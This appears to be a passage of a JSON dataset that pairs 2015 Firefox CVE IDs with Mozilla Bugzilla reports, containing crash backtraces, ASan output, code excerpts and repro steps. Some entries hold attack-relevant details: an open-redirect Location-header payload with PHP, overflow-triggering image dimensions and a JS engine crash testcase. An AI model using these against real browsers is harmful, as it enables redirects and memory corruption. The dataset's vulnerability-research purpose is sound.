00 00 00 00 00 0x0ff7e93db190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Expected results: It shouldn't crash."
      }
    ],
    "CVE-2015-7195": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1211871",
        "title": "Certain escaped characters in host of Location-header are being treated as non-escaped",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56 Steps to reproduce: I've identified that the latest version of Aurora 41 (Both on PC and Mac, 41.0.1) is treating URLs with escaped characters in the host of the Location header differently than previous versions. Actual results: The following header: Location: http://example.com%0a%23.google.com/ Would in earlier versions result in an error. However in 41 it's actually redirecting you to http://example.com In simple PHP code this means: <? header(\"Location: http://example.com%0a%23.google.com/\"); I have attached an image showing the Location-header of my test URL which resulted in a redirect to example.com I've identified this issue on a couple of websites that do care about preventing Open Redirect issues (mostly because of non secured OAuth implementations using response_type=token, such as Facebook Connect). Previously these companies have been covered by the fact that the escaped characters in the subdomain of a host are throwing an error, but since Firefox now treats the characters differently, and sends the user to example.com, this is obviously not enough anymore for preventing an open redirect in Firefox. Expected results: I've checked the same redirect in IE, Chrome, Safari and earlier version of Firefox and this issue is not present in any of those browsers, they are either sending the user to the subdomain to Google.com (which is not a valid one of course) or resulting in an error. If I'm reading the RFC properly, these characters are not valid parts of a host thus an error is the correct way of handling a Location-header like this. What's interesting here also is that this form of redirect to example.com is only possible through the Location-header. Both meta and javascript-redirects are resulting in an error instead."
      }
    ],
    "CVE-2015-7197": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1204269",
        "title": "WebSocket secure requirements can be bypassed in a worker",
        "description": "See https://alice.csrf.jp/sw/websocket/. What is happening is that GetEntryGlobal() in <https://dxr.mozilla.org/mozilla-central/rev/9771bd5e56edd07e21cf008dcadc20d7ed970ce3/dom/base/WebSocket.cpp#1551> is returning null, and our stack looks like this: * frame #0: 0x00000001030fcab1 XUL`mozilla::dom::ScriptSettingsStack::EntryGlobal() + 17 at ScriptSettings.cpp:72 frame #1: 0x00000001030cdeb9 XUL`mozilla::dom::GetEntryGlobal() + 9 at ScriptSettings.cpp:188 frame #2: 0x00000001030eae27 XUL`mozilla::dom::WebSocketImpl::Init(this=0x00000001300c3280, aCx=0x0000000000000000, aPrincipal=0x000000011e50a340, aURL=0x0000000130804720, aProtocolArray=0x0000000130804188, aScriptFile=0x000000012ad70de0, aScriptLine=5, aScriptColumn=13, aRv=0x00000001308046e8, aConnectionFailed=0x0000000130804137) + 2839 at WebSocket.cpp:1551 frame #3: 0x00000001030fa4aa XUL`mozilla::dom::(anonymous namespace)::InitRunnable::InitWindowless(this=0x000000012ad70da0, aTopLevelWorkerPrivate=0x000000011e997600) + 330 at WebSocket.cpp:1093 frame #4: 0x00000001030fa08d XUL`mozilla::dom::(anonymous namespace)::WebSocketMainThreadRunnable::MainThreadRun(this=0x000000012ad70da0) + 157 at WebSocket.cpp:1029 frame #5: 0x0000000104eb87d3 XUL`mozilla::dom::workers::WorkerMainThreadRunnable::Run(this=0x000000012ad70da0) + 35 at WorkerRunnable.cpp:584 frame #6: 0x00000001016f00a3 XUL`nsThread::ProcessNextEvent(this=0x000000010063d800, aMayWait=false, aResult=0x00007fff5fbfcee3) + 1795 at nsThread.cpp:874 frame #7: 0x000000010176c331 XUL`NS_ProcessPendingEvents(aThread=0x000000010063d800, aTimeout=10) + 145 at nsThreadUtils.cpp:219 frame #8: 0x00000001051f2f9e XUL`nsBaseAppShell::NativeEventCallback(this=0x00000001007b74c0) + 190 at nsBaseAppShell.cpp:97 frame #9: 0x000000010528189a XUL`nsAppShell::ProcessGeckoEvents(aInfo=0x00000001007b74c0) + 442 at nsAppShell.mm:387 frame #10: 0x00007fff8a719a01 CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ + 17 frame #11: 0x00007fff8a70bb8d CoreFoundation`__CFRunLoopDoSources0 + 269 frame #12: 0x00007fff8a70b1bf CoreFoundation`__CFRunLoopRun + 927 frame #13: 0x00007fff8a70abd8 CoreFoundation`CFRunLoopRunSpecific + 296 frame #14: 0x00007fff8d0bd56f HIToolbox`RunCurrentEventLoopInMode + 235 frame #15: 0x00007fff8d0bd2ea HIToolbox`ReceiveNextEventCommon + 431 frame #16: 0x00007fff8d0bd12b HIToolbox`_BlockUntilNextEventMatchingListInModeWithFilter + 71 frame #17: 0x00007fff941608ab AppKit`_DPSNextEvent + 978 frame #18: 0x00007fff9415fe58 AppKit`-[NSApplication nextEventMatchingMask:untilDate:inMode:dequeue:] + 346 frame #19: 0x0000000105280404 XUL`-[GeckoNSApplication nextEventMatchingMask:untilDate:inMode:dequeue:](self=0x00000001007b7560, _cmd=0x00007fff94a7c7f8, mask=18446744073709551615, expiration=0x422d63c37f00000d, mode=0x00007fff79fe1040, flag='\\x01') + 116 at nsAppShell.mm:121 frame #20: 0x00007fff94155af3 AppKit`-[NSApplication run] + 594 frame #21: 0x000000010528226c XUL`nsAppShell::Run(this=0x00000001007b74c0) + 172 at nsAppShell.mm:661 frame #22: 0x000000010626976b XUL`nsAppStartup::Run(this=0x0000000119732be0) + 155 at nsAppStartup.cpp:281 frame #23: 0x000000010633c991 XUL`XREMain::XRE_mainRun(this=0x00007fff5fbfee80) + 5841 at nsAppRunner.cpp:4292 frame #24: 0x000000010633d247 XUL`XREMain::XRE_main(this=0x00007fff5fbfee80, argc=5, argv=0x00007fff5fbff788, aAppData=0x00007fff5fbff108) + 935 at nsAppRunner.cpp:4389 frame #25: 0x000000010633d6c2 XUL`XRE_main(argc=5, argv=0x00007fff5fbff788, aAppData=0x00007fff5fbff108, aFlags=0) + 98 at nsAppRunner.cpp:4478 frame #26: 0x0000000100001c48 firefox`do_main(argc=5, argv=0x00007fff5fbff788, xreDirectory=0x0000000100632ac0) + 1768 at nsBrowserApp.cpp:212 frame #27: 0x000000010000108d firefox`main(argc=5, argv=0x00007fff5fbff788) + 285 at nsBrowserApp.cpp:399 frame #28: 0x0000000100000b54 firefox`start + 52 I think we need to compute originIsHttps in the constructor of WebSocket and pass it down to WebSocketImpl::Init()."
      }
    ],
    "CVE-2015-7198": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1188010",
        "title": "Overflow in TextureStorage11::setData can cause memory-safety bug",
        "description": "TextureStorage11::setData (gfx\\angle\\src\\libGLESv2\\renderer\\d3d\\d3d11\\TextureStorage11.cpp) can experience an overflow if its caller specifies a destBox or image argument with unusually-large dimensions. On overflow, setData allocates a buffer that is far too small, then loads an image into it, thus writing memory it does not own. It is unclear whether checks elsewhere that limit the size of images, such as those in WebGL2Content::TexImage3D (dom\\canvas\\WebGL2ContentTextures.cpp), make TextureStorage11::setData safe in practice. In any case, it is safer for each function or object to protect itself from insecure operation than for a function in a deeper layer to rely upon checks made by a function closer to the security perimeter. Details: Using ints and UINTs, setData computes the quantity: outputPixelSize * width * height * depth where outputPixelSize is the number of bytes per pixel (probably always 4), and width, height, and depth are derived from either the destBox argument (if specified) or else the |image| argument: 461: gl::Error TextureStorage11::setData(const gl::ImageIndex &index, Image *image, const gl::Box *destBox, GLenum type, 462: const gl::PixelUnpackState &unpack, const uint8_t *pixelData) ... 485: int width = destBox ? destBox->width : static_cast<int>(image->getWidth()); 486: int height = destBox ? destBox->height : static_cast<int>(image->getHeight()); 487: int depth = destBox ? destBox->depth : static_cast<int>(image->getDepth()); 488: UINT srcRowPitch = internalFormatInfo.computeRowPitch(type, width, unpack.alignment); 489: UINT srcDepthPitch = internalFormatInfo.computeDepthPitch(type, width, height, unpack.alignment); 490: 491: const d3d11::TextureFormat &d3d11Format = d3d11::GetTextureFormatInfo(image->getInternalFormat()); 492: const d3d11::DXGIFormat &dxgiFormatInfo = d3d11::GetDXGIFormatInfo(d3d11Format.texFormat); 493: 494: size_t outputPixelSize = dxgiFormatInfo.pixelBytes; 495: 496: UINT bufferRowPitch = outputPixelSize * width; 497: UINT bufferDepthPitch = bufferRowPitch * height; 498: 499: MemoryBuffer conversionBuffer; 500: if (!conversionBuffer.resize(bufferDepthPitch * depth)) 501: { 502: return gl::Error(GL_OUT_OF_MEMORY, \"Failed to allocate internal buffer.\"); 503: } 503: 505: // TODO: fast path 506: LoadImageFunction loadFunction = d3d11Format.loadFunctions.at(type); 507: loadFunction(width, height, depth, 508: pixelData, srcRowPitch, srcDepthPitch, 509: conversionBuffer.data(), bufferRowPitch, bufferDepthPitch); ... Thus, a 3D image as small as 1024x1024x1025x32bpp or a 2D image as small as 32768x32769x32bpp could cause an overflow."
      }
    ],
    "CVE-2015-7199": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1204061",
        "title": "Missing status checks in AddWeightedPathSegLists and SVGPathSegListSMILType::Interpolate cause memory-safety bugs",
        "description": "AddWeightedPathSegLists (dom\\svg\\SVGPathSegListSMILType.cpp) calls SetLength on a FallibleTArray without checking the result in release builds. If FF is almost out of memory for some other reason and/or a page includes code that invokes this function with an SVG path with an unusually-large number of segments, SetLength could invisibly fail. AddWeightedPathSegLists would then overwrite memory that it doesn't own. There is also a similar bug in SVGPathSegListSMILType::Interpolate in the same module. The bugs are latent because the functions in which they occur don't seem to be called by anything in the codebase (please verify). Details: -------- The bug in AddWeightedPathSegLists is in lines 267-68: The assert message on line 268 is misleading... 236:static void 237:AddWeightedPathSegLists(double aCoeff1, const SVGPathDataAndInfo& aList1, 238: double aCoeff2, const SVGPathDataAndInfo& aList2, 239: SVGPathDataAndInfo& aResult) ... 266: if (aResult.IsIdentity()) { 267: DebugOnly<bool> success = aResult.SetLength(aList2.Length()); 268: MOZ_ASSERT(success, \"infallible nsTArray::SetLength should succeed\"); 269: aResult.SetElement(aList2.Element()); // propagate target element info! 270: } 271: 272: SVGPathDataAndInfo::iterator resultIter = aResult.begin(); 273: 274: while ((!iter1 || iter1 != end1) && 275: iter2 != end2) { 276: AddWeightedPathSegs(aCoeff1, iter1, 277: aCoeff2, iter2, 278: resultIter); ...because SVGPathDataAndInfo::SetLength actually resizes a FallibleTArray (dom\\svg\\SVGPathData.h): 239: class SVGPathDataAndInfo final : public SVGPathData 240: { ... 283: using SVGPathData::SetLength; 284: using SVGPathData::begin; ... 293: }; 76: class SVGPathData 77: { ... 204: bool SetLength(uint32_t aLength) { 205: return mData.SetLength(aLength); 206: } ... 224: iterator begin() { return mData.Elements(); } ... 227: FallibleTArray<float> mData; 228:}; So if SetLength fails, SVGPathSegListSMILType.cpp line 272 derives an iterator to memory that it has no right to use, and the function call on lines 276-78 writes into that memory. This bug is still present in 9/10/2015's Aurora (http://hg.mozilla.org/releases/mozilla-aurora/file/136110a23c39/dom/svg/SVGPathSegListSMILType.cpp , http://hg.mozilla.org/releases/mozilla-aurora/file/136110a23c39/dom/svg/SVGPathData.h )."
      }
    ],
    "CVE-2015-7201": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1203135",
        "title": "crash in link_shaders",
        "description": "This bug was filed from the Socorro interface and is report bp-66c41d6d-d10f-459f-b03b-b7ff22150909. ============================================================= Note: this is a follow up issue filed for Bug 1189860. Marked as security-sensitive as well, since it derived from it. Reproducible on: * 41.0b8 (20150907144446) * 42.0a2 (2015-09-07) e10s & non-e10s * 43.0a1 (2015-09-07) e10s & non-e10s Affected platforms: Linux-only, tested with Ubuntu 14.04 (x86) and Ubuntu 14.04 (x64) Steps to reproduce: 1. See attached HTML and JS; extract and name the JS \"poc.js\" and put it in the same folder as the extracted HTML. 2. Launch Firefox and load the HTML. Expected result: As in the case of Windows and Mac OS X platforms, a \"Could not initialise shaders\" error is displayed. Actual result: Firefox crashes. Additional notes: * See Bug 1189860, Comment 15 for context."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1224100",
        "title": "\"Conditional jump or move depends on uninitialised value(s)\" at imgFrame::Optimize",
        "description": "1. http://www.ref4bux.com/index.php?view=ads 2. Spin the wheel to determine your Crash signature. bp-29c4ae76-8643-4453-a758-3b4da2151112 [@ js::jit::EnterBaselineMethod ] exploitability low bp-3e41d6cd-49e4-4ab2-86ef-1357c2151112 [@ nsDisplayList::SortByZOrder ] bp-001dcdfd-2e77-454e-af93-96fb92151112 [@ AddRule ] Bughunter shows crashes across the board on all branches/platforms for opt and debug with a variety of stacks/signatures including some rated low on Windows -> S-S Asan reports ==18315==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x619000d308f0 at pc 0x7f8c08342d5e bp 0x7f8bf0954e20 sp 0x7f8bf0954e18 ==18315==AddressSanitizer: while reporting a bug found another one.Ignoring."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1225250",
        "title": "«failed assertion \"fPixelRef->rowBytes() == fRowBytes\"» with canvas, shadow, drawImage(HTMLVideoElement)",
        "description": "Debug: gfx/skia/skia/src/core/SkBitmap.cpp:1343: failed assertion \"fPixelRef->rowBytes() == fRowBytes\" ASan: SEGV on unknown address [@ S16_opaque_D32_filter_DX] Nightly: bp-66bed0f0-5e76-458d-a14b-e8d112151116 [@ S16_opaque_D32_filter_DX]"
      }
    ],
    "CVE-2015-7202": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1193757",
        "title": "Crash [@ graphite2::vm::Machine::Code::decoder::emit_opcode]",
        "description": "The attached testcase crashes on graphite2 revision fa8d4398dded (run through the gr2fonttest command line utility). Backtrace: ==11150==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61a00001f753 at pc 0x7f5d80cf5439 bp 0x7fffe01ccaa0 sp 0x7fffe01cca98 READ of size 1 at 0x61a00001f753 thread T0 #0 0x7f5d80cf5438 in graphite2::vm::Machine::Code::decoder::emit_opcode(graphite2::vm::opcode, unsigned char const*&) /src/Code.cpp:553 #1 0x7f5d80cde90a in graphite2::vm::Machine::Code::decoder::load(unsigned char const*, unsigned char const*) /src/Code.cpp:260 #2 0x7f5d80cde90a in graphite2::vm::Machine::Code::Code(bool, unsigned char const*, unsigned char const*, unsigned char, unsigned short, graphite2::Silf const&, graphite2::Face const&, graphite2::passtype, unsigned char*&) /src/Code.cpp:194 #3 0x7f5d80d5bf0c in graphite2::Pass::readRules(unsigned char const*, unsigned long, unsigned char const*, unsigned short const*, unsigned short const*, unsigned char const*, unsigned short const*, unsigned char const*, graphite2::Face&, graphite2::passtype, graphite2::Error&) /src/Pass.cpp:238 #4 0x7f5d80d5999c in graphite2::Pass::readPass(unsigned char const*, unsigned long, unsigned long, graphite2::Face&, graphite2::passtype, unsigned int, graphite2::Error&) /src/Pass.cpp:183 #5 0x7f5d80d88b62 in graphite2::Silf::readGraphite(unsigned char const*, unsigned long, graphite2::Face&, unsigned int) /src/Silf.cpp:212 #6 0x7f5d80d1cfb8 in graphite2::Face::readGraphite(graphite2::Face::Table const&) /src/Face.cpp:149 #7 0x7f5d80cb8bef in (anonymous namespace)::load_face(graphite2::Face&, unsigned int) /src/gr_face.cpp:59 #8 0x7f5d80cbbf79 in gr_make_face_with_ops /src/gr_face.cpp:89 #9 0x7f5d80cbbf79 in gr_make_file_face /src/gr_face.cpp:242 #10 0x48ed05 in Parameters::testFileFont() const /gr2fonttest/gr2FontTest.cpp:618 #11 0x49248b in main /gr2fonttest/gr2FontTest.cpp:770 #12 0x7f5d808f9ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4) #13 0x486c4c in _start (/build/gr2fonttest/gr2fonttest+0x486c4c) 0x61a00001f753 is located 0 bytes to the right of 1235-byte region [0x61a00001f280,0x61a00001f753) allocated by thread T0 here: #0 0x46df61 in __interceptor_malloc (/build/gr2fonttest/gr2fonttest+0x46df61) #1 0x7f5d80dadbfe in graphite2::FileFace::get_table_fn(void const*, unsigned int, unsigned long*) /src/FileFace.cpp:90 #2 0x7f5d80d1f79f in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) /src/Face.cpp:274 #3 0x7f5d80cb88e7 in (anonymous namespace)::load_face(graphite2::Face&, unsigned int) /src/gr_face.cpp:49 #4 0x7f5d80cbbf79 in gr_make_face_with_ops /src/gr_face.cpp:89 #5 0x7f5d80cbbf79 in gr_make_file_face /src/gr_face.cpp:242 SUMMARY: AddressSanitizer: heap-buffer-overflow /src/Code.cpp:553 graphite2::vm::Machine::Code::decoder::emit_opcode(graphite2::vm::opcode, unsigned char const*&) Shadow bytes around the buggy address: 0x0c347fffbe90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c347fffbea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c347fffbeb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c347fffbec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c347fffbed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c347fffbee0: 00 00 00 00 00 00 00 00 00 00[03]fa fa fa fa fa 0x0c347fffbef0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c347fffbf00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c347fffbf10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c347fffbf20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c347fffbf30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe ==11150==ABORTING Note that this is on graphite2 trunk and without OTS in front of it. We tested this particular file and Firefox and it is rejected by OTS with the message: \"Sill: table overruns end of file\" However, according to cdiehl that doesn't necessarily mean that the bug cannot be reached through OTS (e.g. by fixing up the testcase enough to make it through). Marking s-s until we confirmed that this bug cannot be reached/exploited with OTS enabled."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1188105",
        "title": "Possible buffer overwrite in SplitDriverVersion",
        "description": "+++ This bug was initially created as a clone of Bug #791742 +++ Coverity indicates a possible buffer overwrite in |SplitDriverVersion| [1]. We bail if |destIdx| > 4 [2], but if |destIdx| == 4 we'll overwrite the |dest| buffer. Rough breakdown from Coverity: > 184inline bool SplitDriverVersion(const char *aSource, char *aAStr, char *aBStr, char *aCStr, char *aDStr) > 185{ > 186 // sscanf doesn't do what we want here to we parse this manually. > 187 int len = strlen(aSource); > 188 char *dest[4] = { aAStr, aBStr, aCStr, aDStr }; > 189 unsigned destIdx = 0; > 190 unsigned destPos = 0; > 191 > 1. Condition i < len, taking true branch > 5. Condition i < len, taking true branch > 192 for (int i = 0; i < len; i++) { > 2. Condition destIdx > 4UL /* mozilla::ArrayLength(dest) */, taking false branch > 6. Condition destIdx > 4UL /* mozilla::ArrayLength(dest) */, taking false branch > 7. cond_at_most: Checking destIdx > 4UL implies that destIdx may be up to 4 on the false branch. > 193 if (destIdx > ArrayLength(dest)) { > 194 // Invalid format found. Ensure we don't access dest beyond bounds. > 195 return false; > 196 } > 197 > 3. Condition aSource[i] == '.', taking true branch > 8. Condition aSource[i] == '.', taking true branch > 198 if (aSource[i] == '.') { > CID 1299530 (#1 of 1): Out-of-bounds read (OVERRUN)9. overrun-local: Overrunning array dest of 4 8-byte elements at element index 4 (byte offset 32) using index destIdx++ (which evaluates to 4). > 199 dest[destIdx++][destPos] = 0; > 200 destPos = 0; > 4. Continuing loop > 201 continue; > 202 } > 203 [1] https://hg.mozilla.org/mozilla-central/annotate/2ddec2dedced/widget/GfxDriverInfo.h#l185 [2] https://hg.mozilla.org/mozilla-central/annotate/2ddec2dedced/widget/GfxDriverInfo.h#l194"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1212305",
        "title": "Assertion failure: calleeScript->hasBaselineScript(), at js/src/jit/Ion.cpp:619",
        "description": "The following testcase crashes on mozilla-central revision 67adec79eb8a (build with --enable-optimize --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --enable-debug, run with --fuzzing-safe --thread-count=2 --ion-shared-stubs=on): (No proper testcase available, filing on behalf of h4writer). Backtrace: Program terminated with signal SIGSEGV, Segmentation fault. #0 0x00000000009b2c0a in js::jit::LazyLink (cx=cx@entry=0x7fce97806c00, calleeScript=..., calleeScript@entry=...) at js/src/jit/Ion.cpp:619 #1 0x00000000009b46f1 in js::jit::CanEnter (cx=cx@entry=0x7fce97806c00, state=...) at js/src/jit/Ion.cpp:2573 #2 0x0000000000705f1d in js::RunScript (cx=cx@entry=0x7fce97806c00, state=...) at js/src/vm/Interpreter.cpp:685 #3 0x000000000070674f in js::Invoke (cx=cx@entry=0x7fce97806c00, args=..., construct=construct@entry=js::NO_CONSTRUCT) at js/src/vm/Interpreter.cpp:786 #4 0x00000000007072bd in js::Invoke (cx=cx@entry=0x7fce97806c00, thisv=..., fval=..., argc=argc@entry=1, argv=argv@entry=0x7fff0cdc7770, rval=..., rval@entry=...) at js/src/vm/Interpreter.cpp:823 #5 0x00000000008d687b in js::jit::DoCallFallback (cx=0x7fce97806c00, frame=0x7fff0cdc77c8, stub_=<optimized out>, argc=<optimized out>, vp=0x7fff0cdc7760, res=...) at js/src/jit/BaselineIC.cpp:8905 #6 0x00007fce98d87f9f in ?? () #33 0x0000000000000000 in ?? () rax 0x0 0 rbx 0x7fce97806c00 140525281766400 rcx 0x7fce97bd688d 140525285763213 rdx 0x0 0 rsi 0x7fce97eab9d0 140525288733136 rdi 0x7fce97eaa1c0 140525288726976 rbp 0x7fff0cdc6f80 140733409161088 rsp 0x7fff0cdc6d90 140733409160592 r8 0x7fce98f1b780 140525305968512 r9 0x6372732f736a2f6c 7165916604736876396 r10 0x7fce97ea7be0 140525288717280 r11 0x0 0 r12 0x7fce95920258 140525249364568 r13 0x7fff0cdc6ed0 140733409160912 r14 0x7fff0cdc6e20 140733409160736 r15 0x7fff0cdc6e38 140733409160760 rip 0x9b2c0a <js::jit::LazyLink(JSContext*, JS::Handle<JSScript*>)+1514> => 0x9b2c0a <js::jit::LazyLink(JSContext*, JS::Handle<JSScript*>)+1514>: movl $0x26b,0x0 0x9b2c15 <js::jit::LazyLink(JSContext*, JS::Handle<JSScript*>)+1525>: callq 0x4979a0 <abort()>"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1221421",
        "title": "\"Assertion failure: this->is<T>()\" in array_length_getter after changing __proto__ on DOM style object",
        "description": "Assertion failure: this->is<T>(), at js/src/jsobj.h:547"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1221904",
        "title": "\"ASSERTION: Invalid offset\" with bidi text change",
        "description": "###!!! ASSERTION: Invalid offset: 'uint32_t(aOffset) <= mSkipChars->mCharCount', file gfx/thebes/gfxSkipChars.cpp, line 23 ###!!! ASSERTION: Text run does not map enough text for our reflow: 'gfxSkipCharsIterator(iter).ConvertOriginalToSkipped(offset + length) <= mTextRun->GetLength()', file layout/generic/nsTextFrame.cpp, line 8480"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1194002",
        "title": "Crash [@ graphite2::TtfUtil::HorMetrics]",
        "description": "The attached testcase crashes on graphite2 revision fa8d4398dded (run through the gr2fonttest command line utility). Backtrace: ==28115==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61a00001f706 at pc 0x7f3bcd019dad bp 0x7fffd5cd5d40 sp 0x7fffd5cd5d38 READ of size 2 at 0x61a00001f706 thread T0 #0 0x7f3bcd019dac in graphite2::TtfUtil::HorMetrics(unsigned short, void const*, unsigned long, void const*, int&, unsigned int&) /src/TtfUtil.cpp:801:16 #1 0x7f3bccfa3f6f in graphite2::GlyphCache::Loader::read_glyph(unsigned short, graphite2::GlyphFace&, int*) const /src/GlyphCache.cpp:353 #2 0x7f3bccfa2406 in graphite2::GlyphCache::GlyphCache(graphite2::Face const&, unsigned int) /src/GlyphCache.cpp:139 #3 0x7f3bccf8e304 in graphite2::Face::readGlyphs(unsigned int) /src/Face.cpp:98 #4 0x7f3bccf2ba7b in (anonymous namespace)::load_face(graphite2::Face&, unsigned int) /src/gr_face.cpp:54 #5 0x7f3bccf2ef79 in gr_make_face_with_ops /src/gr_face.cpp:89 #6 0x7f3bccf2ef79 in gr_make_file_face /src/gr_face.cpp:242 #7 0x48ed05 in Parameters::testFileFont() const /gr2fonttest/gr2FontTest.cpp:618 #8 0x49248b in main /gr2fonttest/gr2FontTest.cpp:770 #9 0x7f3bccb6cec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4) #10 0x486c4c in _start (/build/gr2fonttest/gr2fonttest+0x486c4c) 0x61a00001f706 is located 0 bytes to the right of 1158-byte region [0x61a00001f280,0x61a00001f706) allocated by thread T0 here: #0 0x46df61 in __interceptor_malloc (/build/gr2fonttest/gr2fonttest+0x46df61) #1 0x7f3bcd020bfe in graphite2::FileFace::get_table_fn(void const*, unsigned int, unsigned long*) /src/FileFace.cpp:90 #2 0x7f3bccf9279f in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) /src/Face.cpp:274 #3 0x7f3bccfaa5c9 in graphite2::GlyphCache::Loader::Loader(graphite2::Face const&, bool) /src/GlyphCache.cpp:248 #4 0x7f3bccfa1211 in graphite2::GlyphCache::GlyphCache(graphite2::Face const&, unsigned int) /src/GlyphCache.cpp:123 #5 0x7f3bccf8e304 in graphite2::Face::readGlyphs(unsigned int) /src/Face.cpp:98 SUMMARY: AddressSanitizer: heap-buffer-overflow /src/TtfUtil.cpp:801 graphite2::TtfUtil::HorMetrics(unsigned short, void const*, unsigned long, void const*, int&, unsigned int&) Shadow bytes around the buggy address: 0x0c347fffbe90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c347fffbea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c347fffbeb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c347fffbec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c347fffbed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c347fffbee0:[06]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c347fffbef0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c347fffbf00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c347fffbf10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c347fffbf20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c347fffbf30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe ==28115==ABORTING Note that this is on graphite2 trunk and without OTS in front of it. We tested this particular file and Firefox and it is rejected by OTS with: metrics: Bad number of metrics 3617 hhea: Failed to parse horizontal metrics hhea: Failed to parse table However, according to cdiehl that doesn't necessarily mean that the bug cannot be reached through OTS (e.g. by fixing up the testcase enough to make it through). Marking s-s until we confirmed that this bug cannot be reached/exploited with OTS enabled."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1207571",
        "title": "Crash [@ js::DispatchValueTyped] or Crash [@ js::gc::TenuredCell::zone] with asm.js",
        "description": "The following testcase crashes on mozilla-central revision 2235e56c94cf (build with --enable-optimize --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --disable-debug, run with --fuzzing-safe --thread-count=2): var lfcode = new Array(); lfcode.push = loadFile; lfcode.push(''); lfcode.push(''); lfcode.push(''); lfcode.push(''); lfcode.push('0'); lfcode.push(` function Function(stdlib) { \"use asm\"; var abs = stdlib.Math.abs; function f(p) { p = p|0; } return f; } `); lfcode.push(''); lfcode.push('2'); lfcode.push(''); lfcode.push(''); lfcode.push(''); lfcode.push('4'); lfcode.push(\"gczeal(14, 1);\"); lfcode.push('2'); lfcode.push(''); function loadFile(lfVarx) { try { if (lfVarx.substr(-3) != \".js\" && lfVarx.length != 1) { switch (lfRunTypeId) { case 0: evaluate(lfVarx); break; case 2: new Function(lfVarx)(); break; case 4: eval(\"(function() { \" + lfVarx + \" })();\"); break; } } else if (!isNaN(lfVarx)) { lfRunTypeId = parseInt(lfVarx); } } catch (lfVare) { } } Backtrace: Program received signal SIGSEGV, Segmentation fault. js::DispatchValueTyped<DoMarkingFunctor<JS::Value>, js::GCMarker*&>(DoMarkingFunctor<JS::Value>, JS::Value const&, (decltype ({parm#1}((JSObject*)((decltype(nullptr))0), (Forward<js::GCMarker*&>)({parm#3})))&&)...) (f=..., val=...) at ../../dist/include/js/Value.h:1841 #0 js::DispatchValueTyped<DoMarkingFunctor<JS::Value>, js::GCMarker*&>(DoMarkingFunctor<JS::Value>, JS::Value const&, (decltype ({parm#1}((JSObject*)((decltype(nullptr))0), (Forward<js::GCMarker*&>)({parm#3})))&&)...) (f=..., val=...) at 